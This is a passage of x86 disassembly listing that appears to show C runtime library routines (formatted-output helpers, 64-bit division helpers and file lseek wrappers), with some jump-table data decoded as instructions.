  40d1b6:	e9 7a ff ff ff       	jmp    0x40d135
  40d1bb:	eb 1b                	jmp    0x40d1d8
  40d1bd:	8d 95 d0 fd ff ff    	lea    -0x230(%ebp),%edx
  40d1c3:	52                   	push   %edx
  40d1c4:	8b 45 08             	mov    0x8(%ebp),%eax
  40d1c7:	50                   	push   %eax
  40d1c8:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40d1cb:	51                   	push   %ecx
  40d1cc:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40d1cf:	52                   	push   %edx
  40d1d0:	e8 1b 02 00 00       	call   0x40d3f0
  40d1d5:	83 c4 10             	add    $0x10,%esp
  40d1d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d1db:	83 e0 04             	and    $0x4,%eax
  40d1de:	85 c0                	test   %eax,%eax
  40d1e0:	74 1c                	je     0x40d1fe
  40d1e2:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40d1e8:	51                   	push   %ecx
  40d1e9:	8b 55 08             	mov    0x8(%ebp),%edx
  40d1ec:	52                   	push   %edx
  40d1ed:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  40d1f3:	50                   	push   %eax
  40d1f4:	6a 20                	push   $0x20
  40d1f6:	e8 b5 01 00 00       	call   0x40d3b0
  40d1fb:	83 c4 10             	add    $0x10,%esp
  40d1fe:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40d202:	74 15                	je     0x40d219
  40d204:	6a 02                	push   $0x2
  40d206:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40d209:	51                   	push   %ecx
  40d20a:	e8 21 90 ff ff       	call   0x406230
  40d20f:	83 c4 08             	add    $0x8,%esp
  40d212:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40d219:	e9 7d f3 ff ff       	jmp    0x40c59b
  40d21e:	8b 85 d0 fd ff ff    	mov    -0x230(%ebp),%eax
  40d224:	5f                   	pop    %edi
  40d225:	5e                   	pop    %esi
  40d226:	5b                   	pop    %ebx
  40d227:	8b e5                	mov    %ebp,%esp
  40d229:	5d                   	pop    %ebp
  40d22a:	c3                   	ret
  40d22b:	37                   	aaa
  40d22c:	c6 40 00 d1          	movb   $0xd1,0x0(%eax)
  40d230:	c6 40 00 13          	movb   $0x13,0x0(%eax)
  40d234:	c7 40 00 82 c7 40 00 	movl   $0x40c782,0x0(%eax)
  40d23b:	da c7                	fcmovb %st(7),%st
  40d23d:	40                   	inc    %eax
  40d23e:	00 e9                	add    %ch,%cl
  40d240:	c7 40 00 35 c8 40 00 	movl   $0x40c835,0x0(%eax)
  40d247:	c8 c8 40 00          	enter  $0x40c8,$0x0
  40d24b:	5f                   	pop    %edi
  40d24c:	c7 40 00 6a c7 40 00 	movl   $0x40c76a,0x0(%eax)
  40d253:	55                   	push   %ebp
  40d254:	c7 40 00 4a c7 40 00 	movl   $0x40c74a,0x0(%eax)
  40d25b:	75 c7                	jne    0x40d224
  40d25d:	40                   	inc    %eax
  40d25e:	00 7d c7             	add    %bh,-0x39(%ebp)
  40d261:	40                   	inc    %eax
  40d262:	00 00                	add    %al,(%eax)
  40d264:	05 05 01 05 05       	add    $0x5050105,%eax
  40d269:	05 05 05 05 05       	add    $0x5050505,%eax
  40d26e:	02 05 03 05 05 04    	add    0x4050503,%al
  40d274:	77 c8                	ja     0x40d23e
  40d276:	40                   	inc    %eax
  40d277:	00 b0 c8 40 00 6c    	add    %dh,0x6c0040c8(%eax)
  40d27d:	c8 40 00 ba          	enter  $0x40,$0xba
  40d281:	c8 40 00 c3          	enter  $0x40,$0xc3
  40d285:	c8 40 00 00          	enter  $0x40,$0x0
  40d289:	04 04                	add    $0x4,%al
  40d28b:	04 04                	add    $0x4,%al
  40d28d:	04 04                	add    $0x4,%al
  40d28f:	04 04                	add    $0x4,%al
  40d291:	04 04                	add    $0x4,%al
  40d293:	04 04                	add    $0x4,%al
  40d295:	04 04                	add    $0x4,%al
  40d297:	04 04                	add    $0x4,%al
  40d299:	04 04                	add    $0x4,%al
  40d29b:	04 04                	add    $0x4,%al
  40d29d:	04 04                	add    $0x4,%al
  40d29f:	04 04                	add    $0x4,%al
  40d2a1:	04 04                	add    $0x4,%al
  40d2a3:	04 04                	add    $0x4,%al
  40d2a5:	04 04                	add    $0x4,%al
  40d2a7:	01 04 04             	add    %eax,(%esp,%eax,1)
  40d2aa:	04 02                	add    $0x2,%al
  40d2ac:	04 04                	add    $0x4,%al
  40d2ae:	04 04                	add    $0x4,%al
  40d2b0:	04 04                	add    $0x4,%al
  40d2b2:	04 04                	add    $0x4,%al
  40d2b4:	04 04                	add    $0x4,%al
  40d2b6:	03 03                	add    (%ebx),%eax
  40d2b8:	c9                   	leave
  40d2b9:	40                   	inc    %eax
  40d2ba:	00 97 cb 40 00 27    	add    %dl,0x270040cb(%edi)
  40d2c0:	ca 40 00             	lret   $0x40
  40d2c3:	30 cd                	xor    %cl,%ch
  40d2c5:	40                   	inc    %eax
  40d2c6:	00 92 c9 40 00 18    	add    %dl,0x180040c9(%edx)
  40d2cc:	c9                   	leave
  40d2cd:	40                   	inc    %eax
  40d2ce:	00 03                	add    %al,(%ebx)
  40d2d0:	cd 40                	int    $0x40
  40d2d2:	00 a7 cb 40 00 4c    	add    %ah,0x4c0040cb(%edi)
  40d2d8:	cb                   	lret
  40d2d9:	40                   	inc    %eax
  40d2da:	00 7c cd 40          	add    %bh,0x40(%ebp,%ecx,8)
  40d2de:	00 26                	add    %ah,(%esi)
  40d2e0:	cd 40                	int    $0x40
  40d2e2:	00 3d ca 40 00 1a    	add    %bh,0x1a0040ca
  40d2e8:	cd 40                	int    $0x40
  40d2ea:	00 3c cd 40 00 23 d0 	add    %bh,-0x2fdcffc0(,%ecx,8)
  40d2f1:	40                   	inc    %eax
  40d2f2:	00 00                	add    %al,(%eax)
  40d2f4:	0e                   	push   %cs
  40d2f5:	01 0e                	add    %ecx,(%esi)
  40d2f7:	01 0e                	add    %ecx,(%esi)
  40d2f9:	0e                   	push   %cs
  40d2fa:	0e                   	push   %cs
  40d2fb:	0e                   	push   %cs
  40d2fc:	0e                   	push   %cs
  40d2fd:	0e                   	push   %cs
  40d2fe:	0e                   	push   %cs
  40d2ff:	0e                   	push   %cs
  40d300:	0e                   	push   %cs
  40d301:	0e                   	push   %cs
  40d302:	0e                   	push   %cs
  40d303:	02 0e                	add    (%esi),%cl
  40d305:	0e                   	push   %cs
  40d306:	0e                   	push   %cs
  40d307:	0e                   	push   %cs
  40d308:	03 0e                	add    (%esi),%ecx
  40d30a:	04 0e                	add    $0xe,%al
  40d30c:	0e                   	push   %cs
  40d30d:	0e                   	push   %cs
  40d30e:	0e                   	push   %cs
  40d30f:	0e                   	push   %cs
  40d310:	0e                   	push   %cs
  40d311:	0e                   	push   %cs
  40d312:	0e                   	push   %cs
  40d313:	05 06 07 07 07       	add    $0x7070706,%eax
  40d318:	0e                   	push   %cs
  40d319:	06                   	push   %es
  40d31a:	0e                   	push   %cs
  40d31b:	0e                   	push   %cs
  40d31c:	0e                   	push   %cs
  40d31d:	0e                   	push   %cs
  40d31e:	08 09                	or     %cl,(%ecx)
  40d320:	0a 0e                	or     (%esi),%cl
  40d322:	0e                   	push   %cs
  40d323:	0b 0e                	or     (%esi),%ecx
  40d325:	0c 0e                	or     $0xe,%al
  40d327:	0e                   	push   %cs
  40d328:	0d cc cc cc cc       	or     $0xcccccccc,%eax
  40d32d:	cc                   	int3
  40d32e:	cc                   	int3
  40d32f:	cc                   	int3
  40d330:	55                   	push   %ebp
  40d331:	8b ec                	mov    %esp,%ebp
  40d333:	51                   	push   %ecx
  40d334:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d337:	8b 48 04             	mov    0x4(%eax),%ecx
  40d33a:	83 e9 01             	sub    $0x1,%ecx
  40d33d:	8b 55 0c             	mov    0xc(%ebp),%edx
  40d340:	89 4a 04             	mov    %ecx,0x4(%edx)
  40d343:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d346:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  40d34a:	7c 26                	jl     0x40d372
  40d34c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d34f:	8b 11                	mov    (%ecx),%edx
  40d351:	8a 45 08             	mov    0x8(%ebp),%al
  40d354:	88 02                	mov    %al,(%edx)
  40d356:	0f be 4d 08          	movsbl 0x8(%ebp),%ecx
  40d35a:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40d360:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40d363:	8b 55 0c             	mov    0xc(%ebp),%edx
  40d366:	8b 02                	mov    (%edx),%eax
  40d368:	83 c0 01             	add    $0x1,%eax
  40d36b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d36e:	89 01                	mov    %eax,(%ecx)
  40d370:	eb 13                	jmp    0x40d385
  40d372:	8b 55 0c             	mov    0xc(%ebp),%edx
  40d375:	52                   	push   %edx
  40d376:	8b 45 08             	mov    0x8(%ebp),%eax
  40d379:	50                   	push   %eax
  40d37a:	e8 71 ef ff ff       	call   0x40c2f0
  40d37f:	83 c4 08             	add    $0x8,%esp
  40d382:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d385:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  40d389:	75 0b                	jne    0x40d396
  40d38b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40d38e:	c7 01 ff ff ff ff    	movl   $0xffffffff,(%ecx)
  40d394:	eb 0d                	jmp    0x40d3a3
  40d396:	8b 55 10             	mov    0x10(%ebp),%edx
  40d399:	8b 02                	mov    (%edx),%eax
  40d39b:	83 c0 01             	add    $0x1,%eax
  40d39e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40d3a1:	89 01                	mov    %eax,(%ecx)
  40d3a3:	8b e5                	mov    %ebp,%esp
  40d3a5:	5d                   	pop    %ebp
  40d3a6:	c3                   	ret
  40d3a7:	cc                   	int3
  40d3a8:	cc                   	int3
  40d3a9:	cc                   	int3
  40d3aa:	cc                   	int3
  40d3ab:	cc                   	int3
  40d3ac:	cc                   	int3
  40d3ad:	cc                   	int3
  40d3ae:	cc                   	int3
  40d3af:	cc                   	int3
  40d3b0:	55                   	push   %ebp
  40d3b1:	8b ec                	mov    %esp,%ebp
  40d3b3:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d3b6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d3b9:	83 e9 01             	sub    $0x1,%ecx
  40d3bc:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40d3bf:	85 c0                	test   %eax,%eax
  40d3c1:	7e 20                	jle    0x40d3e3
  40d3c3:	8b 55 14             	mov    0x14(%ebp),%edx
  40d3c6:	52                   	push   %edx
  40d3c7:	8b 45 10             	mov    0x10(%ebp),%eax
  40d3ca:	50                   	push   %eax
  40d3cb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d3ce:	51                   	push   %ecx
  40d3cf:	e8 5c ff ff ff       	call   0x40d330
  40d3d4:	83 c4 0c             	add    $0xc,%esp
  40d3d7:	8b 55 14             	mov    0x14(%ebp),%edx
  40d3da:	83 3a ff             	cmpl   $0xffffffff,(%edx)
  40d3dd:	75 02                	jne    0x40d3e1
  40d3df:	eb 02                	jmp    0x40d3e3
  40d3e1:	eb d0                	jmp    0x40d3b3
  40d3e3:	5d                   	pop    %ebp
  40d3e4:	c3                   	ret
  40d3e5:	cc                   	int3
  40d3e6:	cc                   	int3
  40d3e7:	cc                   	int3
  40d3e8:	cc                   	int3
  40d3e9:	cc                   	int3
  40d3ea:	cc                   	int3
  40d3eb:	cc                   	int3
  40d3ec:	cc                   	int3
  40d3ed:	cc                   	int3
  40d3ee:	cc                   	int3
  40d3ef:	cc                   	int3
  40d3f0:	55                   	push   %ebp
  40d3f1:	8b ec                	mov    %esp,%ebp
  40d3f3:	51                   	push   %ecx
  40d3f4:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d3f7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d3fa:	83 e9 01             	sub    $0x1,%ecx
  40d3fd:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40d400:	85 c0                	test   %eax,%eax
  40d402:	7e 32                	jle    0x40d436
  40d404:	8b 55 14             	mov    0x14(%ebp),%edx
  40d407:	52                   	push   %edx
  40d408:	8b 45 10             	mov    0x10(%ebp),%eax
  40d40b:	50                   	push   %eax
  40d40c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d40f:	0f be 11             	movsbl (%ecx),%edx
  40d412:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40d415:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d418:	50                   	push   %eax
  40d419:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d41c:	83 c1 01             	add    $0x1,%ecx
  40d41f:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40d422:	e8 09 ff ff ff       	call   0x40d330
  40d427:	83 c4 0c             	add    $0xc,%esp
  40d42a:	8b 55 14             	mov    0x14(%ebp),%edx
  40d42d:	83 3a ff             	cmpl   $0xffffffff,(%edx)
  40d430:	75 02                	jne    0x40d434
  40d432:	eb 02                	jmp    0x40d436
  40d434:	eb be                	jmp    0x40d3f4
  40d436:	8b e5                	mov    %ebp,%esp
  40d438:	5d                   	pop    %ebp
  40d439:	c3                   	ret
  40d43a:	cc                   	int3
  40d43b:	cc                   	int3
  40d43c:	cc                   	int3
  40d43d:	cc                   	int3
  40d43e:	cc                   	int3
  40d43f:	cc                   	int3
  40d440:	55                   	push   %ebp
  40d441:	8b ec                	mov    %esp,%ebp
  40d443:	8b 45 08             	mov    0x8(%ebp),%eax
  40d446:	8b 08                	mov    (%eax),%ecx
  40d448:	83 c1 04             	add    $0x4,%ecx
  40d44b:	8b 55 08             	mov    0x8(%ebp),%edx
  40d44e:	89 0a                	mov    %ecx,(%edx)
  40d450:	8b 45 08             	mov    0x8(%ebp),%eax
  40d453:	8b 08                	mov    (%eax),%ecx
  40d455:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40d458:	5d                   	pop    %ebp
  40d459:	c3                   	ret
  40d45a:	cc                   	int3
  40d45b:	cc                   	int3
  40d45c:	cc                   	int3
  40d45d:	cc                   	int3
  40d45e:	cc                   	int3
  40d45f:	cc                   	int3
  40d460:	55                   	push   %ebp
  40d461:	8b ec                	mov    %esp,%ebp
  40d463:	8b 45 08             	mov    0x8(%ebp),%eax
  40d466:	8b 08                	mov    (%eax),%ecx
  40d468:	83 c1 08             	add    $0x8,%ecx
  40d46b:	8b 55 08             	mov    0x8(%ebp),%edx
  40d46e:	89 0a                	mov    %ecx,(%edx)
  40d470:	8b 45 08             	mov    0x8(%ebp),%eax
  40d473:	8b 08                	mov    (%eax),%ecx
  40d475:	83 e9 08             	sub    $0x8,%ecx
  40d478:	8b 01                	mov    (%ecx),%eax
  40d47a:	8b 51 04             	mov    0x4(%ecx),%edx
  40d47d:	5d                   	pop    %ebp
  40d47e:	c3                   	ret
  40d47f:	cc                   	int3
  40d480:	55                   	push   %ebp
  40d481:	8b ec                	mov    %esp,%ebp
  40d483:	8b 45 08             	mov    0x8(%ebp),%eax
  40d486:	8b 08                	mov    (%eax),%ecx
  40d488:	83 c1 04             	add    $0x4,%ecx
  40d48b:	8b 55 08             	mov    0x8(%ebp),%edx
  40d48e:	89 0a                	mov    %ecx,(%edx)
  40d490:	8b 45 08             	mov    0x8(%ebp),%eax
  40d493:	8b 08                	mov    (%eax),%ecx
  40d495:	66 8b 41 fc          	mov    -0x4(%ecx),%ax
  40d499:	5d                   	pop    %ebp
  40d49a:	c3                   	ret
  40d49b:	cc                   	int3
  40d49c:	cc                   	int3
  40d49d:	cc                   	int3
  40d49e:	cc                   	int3
  40d49f:	cc                   	int3
  40d4a0:	53                   	push   %ebx
  40d4a1:	56                   	push   %esi
  40d4a2:	8b 44 24 18          	mov    0x18(%esp),%eax
  40d4a6:	0b c0                	or     %eax,%eax
  40d4a8:	75 18                	jne    0x40d4c2
  40d4aa:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40d4ae:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d4b2:	33 d2                	xor    %edx,%edx
  40d4b4:	f7 f1                	div    %ecx
  40d4b6:	8b d8                	mov    %eax,%ebx
  40d4b8:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d4bc:	f7 f1                	div    %ecx
  40d4be:	8b d3                	mov    %ebx,%edx
  40d4c0:	eb 41                	jmp    0x40d503
  40d4c2:	8b c8                	mov    %eax,%ecx
  40d4c4:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40d4c8:	8b 54 24 10          	mov    0x10(%esp),%edx
  40d4cc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d4d0:	d1 e9                	shr    $1,%ecx
  40d4d2:	d1 db                	rcr    $1,%ebx
  40d4d4:	d1 ea                	shr    $1,%edx
  40d4d6:	d1 d8                	rcr    $1,%eax
  40d4d8:	0b c9                	or     %ecx,%ecx
  40d4da:	75 f4                	jne    0x40d4d0
  40d4dc:	f7 f3                	div    %ebx
  40d4de:	8b f0                	mov    %eax,%esi
  40d4e0:	f7 64 24 18          	mull   0x18(%esp)
  40d4e4:	8b c8                	mov    %eax,%ecx
  40d4e6:	8b 44 24 14          	mov    0x14(%esp),%eax
  40d4ea:	f7 e6                	mul    %esi
  40d4ec:	03 d1                	add    %ecx,%edx
  40d4ee:	72 0e                	jb     0x40d4fe
  40d4f0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40d4f4:	77 08                	ja     0x40d4fe
  40d4f6:	72 07                	jb     0x40d4ff
  40d4f8:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40d4fc:	76 01                	jbe    0x40d4ff
  40d4fe:	4e                   	dec    %esi
  40d4ff:	33 d2                	xor    %edx,%edx
  40d501:	8b c6                	mov    %esi,%eax
  40d503:	5e                   	pop    %esi
  40d504:	5b                   	pop    %ebx
  40d505:	c2 10 00             	ret    $0x10
  40d508:	cc                   	int3
  40d509:	cc                   	int3
  40d50a:	cc                   	int3
  40d50b:	cc                   	int3
  40d50c:	cc                   	int3
  40d50d:	cc                   	int3
  40d50e:	cc                   	int3
  40d50f:	cc                   	int3
  40d510:	53                   	push   %ebx
  40d511:	8b 44 24 14          	mov    0x14(%esp),%eax
  40d515:	0b c0                	or     %eax,%eax
  40d517:	75 18                	jne    0x40d531
  40d519:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40d51d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d521:	33 d2                	xor    %edx,%edx
  40d523:	f7 f1                	div    %ecx
  40d525:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d529:	f7 f1                	div    %ecx
  40d52b:	8b c2                	mov    %edx,%eax
  40d52d:	33 d2                	xor    %edx,%edx
  40d52f:	eb 50                	jmp    0x40d581
  40d531:	8b c8                	mov    %eax,%ecx
  40d533:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40d537:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40d53b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d53f:	d1 e9                	shr    $1,%ecx
  40d541:	d1 db                	rcr    $1,%ebx
  40d543:	d1 ea                	shr    $1,%edx
  40d545:	d1 d8                	rcr    $1,%eax
  40d547:	0b c9                	or     %ecx,%ecx
  40d549:	75 f4                	jne    0x40d53f
  40d54b:	f7 f3                	div    %ebx
  40d54d:	8b c8                	mov    %eax,%ecx
  40d54f:	f7 64 24 14          	mull   0x14(%esp)
  40d553:	91                   	xchg   %eax,%ecx
  40d554:	f7 64 24 10          	mull   0x10(%esp)
  40d558:	03 d1                	add    %ecx,%edx
  40d55a:	72 0e                	jb     0x40d56a
  40d55c:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  40d560:	77 08                	ja     0x40d56a
  40d562:	72 0e                	jb     0x40d572
  40d564:	3b 44 24 08          	cmp    0x8(%esp),%eax
  40d568:	76 08                	jbe    0x40d572
  40d56a:	2b 44 24 10          	sub    0x10(%esp),%eax
  40d56e:	1b 54 24 14          	sbb    0x14(%esp),%edx
  40d572:	2b 44 24 08          	sub    0x8(%esp),%eax
  40d576:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  40d57a:	f7 da                	neg    %edx
  40d57c:	f7 d8                	neg    %eax
  40d57e:	83 da 00             	sbb    $0x0,%edx
  40d581:	5b                   	pop    %ebx
  40d582:	c2 10 00             	ret    $0x10
  40d585:	cc                   	int3
  40d586:	cc                   	int3
  40d587:	cc                   	int3
  40d588:	cc                   	int3
  40d589:	cc                   	int3
  40d58a:	cc                   	int3
  40d58b:	cc                   	int3
  40d58c:	cc                   	int3
  40d58d:	cc                   	int3
  40d58e:	cc                   	int3
  40d58f:	cc                   	int3
  40d590:	55                   	push   %ebp
  40d591:	8b ec                	mov    %esp,%ebp
  40d593:	51                   	push   %ecx
  40d594:	8b 45 08             	mov    0x8(%ebp),%eax
  40d597:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40d59d:	73 22                	jae    0x40d5c1
  40d59f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d5a2:	c1 f9 05             	sar    $0x5,%ecx
  40d5a5:	8b 55 08             	mov    0x8(%ebp),%edx
  40d5a8:	83 e2 1f             	and    $0x1f,%edx
  40d5ab:	6b d2 24             	imul   $0x24,%edx,%edx
  40d5ae:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40d5b5:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40d5ba:	83 e1 01             	and    $0x1,%ecx
  40d5bd:	85 c9                	test   %ecx,%ecx
  40d5bf:	75 1b                	jne    0x40d5dc
  40d5c1:	e8 3a eb ff ff       	call   0x40c100
  40d5c6:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40d5cc:	e8 3f eb ff ff       	call   0x40c110
  40d5d1:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40d5d7:	83 c8 ff             	or     $0xffffffff,%eax
  40d5da:	eb 32                	jmp    0x40d60e
  40d5dc:	8b 55 08             	mov    0x8(%ebp),%edx
  40d5df:	52                   	push   %edx
  40d5e0:	e8 3b 0a 00 00       	call   0x40e020
  40d5e5:	83 c4 04             	add    $0x4,%esp
  40d5e8:	8b 45 10             	mov    0x10(%ebp),%eax
  40d5eb:	50                   	push   %eax
  40d5ec:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d5ef:	51                   	push   %ecx
  40d5f0:	8b 55 08             	mov    0x8(%ebp),%edx
  40d5f3:	52                   	push   %edx
  40d5f4:	e8 27 00 00 00       	call   0x40d620
  40d5f9:	83 c4 0c             	add    $0xc,%esp
  40d5fc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d5ff:	8b 45 08             	mov    0x8(%ebp),%eax
  40d602:	50                   	push   %eax
  40d603:	e8 a8 0a 00 00       	call   0x40e0b0
  40d608:	83 c4 04             	add    $0x4,%esp
  40d60b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d60e:	8b e5                	mov    %ebp,%esp
  40d610:	5d                   	pop    %ebp
  40d611:	c3                   	ret
  40d612:	cc                   	int3
  40d613:	cc                   	int3
  40d614:	cc                   	int3
  40d615:	cc                   	int3
  40d616:	cc                   	int3
  40d617:	cc                   	int3
  40d618:	cc                   	int3
  40d619:	cc                   	int3
  40d61a:	cc                   	int3
  40d61b:	cc                   	int3
  40d61c:	cc                   	int3
  40d61d:	cc                   	int3
  40d61e:	cc                   	int3
  40d61f:	cc                   	int3
  40d620:	55                   	push   %ebp
  40d621:	8b ec                	mov    %esp,%ebp
  40d623:	83 ec 0c             	sub    $0xc,%esp
  40d626:	8b 45 08             	mov    0x8(%ebp),%eax
  40d629:	50                   	push   %eax
  40d62a:	e8 81 09 00 00       	call   0x40dfb0
  40d62f:	83 c4 04             	add    $0x4,%esp
  40d632:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40d635:	83 7d f4 ff          	cmpl   $0xffffffff,-0xc(%ebp)
  40d639:	75 13                	jne    0x40d64e
  40d63b:	e8 c0 ea ff ff       	call   0x40c100
  40d640:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40d646:	83 c8 ff             	or     $0xffffffff,%eax
  40d649:	e9 80 00 00 00       	jmp    0x40d6ce
  40d64e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40d651:	51                   	push   %ecx
  40d652:	6a 00                	push   $0x0
  40d654:	8b 55 0c             	mov    0xc(%ebp),%edx
  40d657:	52                   	push   %edx
  40d658:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40d65b:	50                   	push   %eax
  40d65c:	ff 15 ec f0 40 00    	call   *0x40f0ec
  40d662:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40d665:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  40d669:	75 0b                	jne    0x40d676
  40d66b:	ff 15 58 f0 40 00    	call   *0x40f058
  40d671:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d674:	eb 07                	jmp    0x40d67d
  40d676:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40d67d:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40d681:	74 11                	je     0x40d694
  40d683:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40d686:	51                   	push   %ecx
  40d687:	e8 d4 e9 ff ff       	call   0x40c060
  40d68c:	83 c4 04             	add    $0x4,%esp
  40d68f:	83 c8 ff             	or     $0xffffffff,%eax
  40d692:	eb 3a                	jmp    0x40d6ce
  40d694:	8b 55 08             	mov    0x8(%ebp),%edx
  40d697:	c1 fa 05             	sar    $0x5,%edx
  40d69a:	8b 45 08             	mov    0x8(%ebp),%eax
  40d69d:	83 e0 1f             	and    $0x1f,%eax
  40d6a0:	6b c0 24             	imul   $0x24,%eax,%eax
  40d6a3:	8b 0c 95 60 f2 45 00 	mov    0x45f260(,%edx,4),%ecx
  40d6aa:	8a 54 01 04          	mov    0x4(%ecx,%eax,1),%dl
  40d6ae:	80 e2 fd             	and    $0xfd,%dl
  40d6b1:	8b 45 08             	mov    0x8(%ebp),%eax
  40d6b4:	c1 f8 05             	sar    $0x5,%eax
  40d6b7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d6ba:	83 e1 1f             	and    $0x1f,%ecx
  40d6bd:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40d6c0:	8b 04 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%eax
  40d6c7:	88 54 08 04          	mov    %dl,0x4(%eax,%ecx,1)
  40d6cb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40d6ce:	8b e5                	mov    %ebp,%esp
  40d6d0:	5d                   	pop    %ebp
  40d6d1:	c3                   	ret
  40d6d2:	cc                   	int3
  40d6d3:	cc                   	int3
  40d6d4:	cc                   	int3
  40d6d5:	cc                   	int3
  40d6d6:	cc                   	int3
  40d6d7:	cc                   	int3
  40d6d8:	cc                   	int3
  40d6d9:	cc                   	int3
  40d6da:	cc                   	int3
  40d6db:	cc                   	int3
  40d6dc:	cc                   	int3
  40d6dd:	cc                   	int3
  40d6de:	cc                   	int3
  40d6df:	cc                   	int3
  40d6e0:	55                   	push   %ebp
  40d6e1:	8b ec                	mov    %esp,%ebp
  40d6e3:	51                   	push   %ecx
  40d6e4:	8b 45 08             	mov    0x8(%ebp),%eax
  40d6e7:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40d6ed:	73 22                	jae    0x40d711
  40d6ef:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d6f2:	c1 f9 05             	sar    $0x5,%ecx
  40d6f5:	8b 55 08             	mov    0x8(%ebp),%edx
  40d6f8:	83 e2 1f             	and    $0x1f,%edx
  40d6fb:	6b d2 24             	imul   $0x24,%edx,%edx
  40d6fe:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40d705:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40d70a:	83 e1 01             	and    $0x1,%ecx
  40d70d:	85 c9                	test   %ecx,%ecx
  40d70f:	75 1b                	jne    0x40d72c
  40d711:	e8 ea e9 ff ff       	call   0x40c100
  40d716:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40d71c:	e8 ef e9 ff ff       	call   0x40c110
  40d721:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40d727:	83 c8 ff             	or     $0xffffffff,%eax
  40d72a:	eb 32                	jmp    0x40d75e
  40d72c:	8b 55 08             	mov    0x8(%ebp),%edx
  40d72f:	52                   	push   %edx
  40d730:	e8 eb 08 00 00       	call   0x40e020
  40d735:	83 c4 04             	add    $0x4,%esp
  40d738:	8b 45 10             	mov    0x10(%ebp),%eax
  40d73b:	50                   	push   %eax
  40d73c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d73f:	51                   	push   %ecx
  40d740:	8b 55 08             	mov    0x8(%ebp),%edx
  40d743:	52                   	push   %edx
  40d744:	e8 27 00 00 00       	call   0x40d770
  40d749:	83 c4 0c             	add    $0xc,%esp
  40d74c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d74f:	8b 45 08             	mov    0x8(%ebp),%eax
  40d752:	50                   	push   %eax
  40d753:	e8 58 09 00 00       	call   0x40e0b0
  40d758:	83 c4 04             	add    $0x4,%esp
  40d75b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d75e:	8b e5                	mov    %ebp,%esp
  40d760:	5d                   	pop    %ebp
  40d761:	c3                   	ret
  40d762:	cc                   	int3
  40d763:	cc                   	int3
  40d764:	cc                   	int3
  40d765:	cc                   	int3
  40d766:	cc                   	int3
